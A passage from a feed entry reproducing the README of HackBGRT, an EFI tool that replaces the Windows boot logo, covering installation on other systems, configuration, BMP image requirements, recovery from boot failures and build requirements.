&lt;code&gt;boot=\EFI\Microsoft\Boot\bootmgfw.efi&lt;/code&gt; in &lt;code&gt;config.txt&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Point your boot loader to &lt;code&gt;\EFI\HackBGRT\bootx64.efi&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;If you need it for other systems as well:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Extract the latest release to &lt;code&gt;[EFI System Partition]\EFI\HackBGRT\&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Set &lt;code&gt;boot=\EFI\your-actual-boot-loader.efi&lt;/code&gt; in &lt;code&gt;config.txt&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Set &lt;code&gt;\EFI\HackBGRT\bootx64.efi&lt;/code&gt; as your default boot loader with &lt;code&gt;efibootmgr&lt;/code&gt; or some other EFI boot manager tool.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;On 32-bit machines, use &lt;code&gt;bootia32.efi&lt;/code&gt; instead of &lt;code&gt;bootx64.efi&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Configuration&lt;/h2&gt; &#xA;&lt;p&gt;The configuration options are described in &lt;code&gt;config.txt&lt;/code&gt;, which should be stored in &lt;code&gt;[EFI System Partition]\EFI\HackBGRT\config.txt&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Images&lt;/h2&gt; &#xA;&lt;p&gt;The image path can be changed in the configuration file. The default path is &lt;code&gt;[EFI System Partition]\EFI\HackBGRT\splash.bmp&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The image must be a 24-bit BMP file with a 54-byte header. That&#39;s a TrueColor BMP3 in Imagemagick, or 24-bit BMP/DIB in Microsoft Paint.&lt;/p&gt; &#xA;&lt;p&gt;Multiple images may be specified, in which case one is picked at random.&lt;/p&gt; &#xA;&lt;h2&gt;Recovery&lt;/h2&gt; &#xA;&lt;p&gt;If something breaks and you can&#39;t boot to Windows, you have the following options:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Windows installation (or recovery) media can fix boot issues.&lt;/li&gt; &#xA; &lt;li&gt;You can copy &lt;code&gt;[EFI System Partition]\EFI\HackBGRT\bootmgfw-original.efi&lt;/code&gt; into &lt;code&gt;[EFI System Partition]\EFI\Microsoft\Boot\bootmgfw.efi&lt;/code&gt; by some other means such as Linux or Windows command prompt.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Building&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Compiler: GCC targeting w64-mingw32&lt;/li&gt; &#xA; &lt;li&gt;Compiler flags: see Makefile&lt;/li&gt; &#xA; &lt;li&gt;Libraries: gnu-efi&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>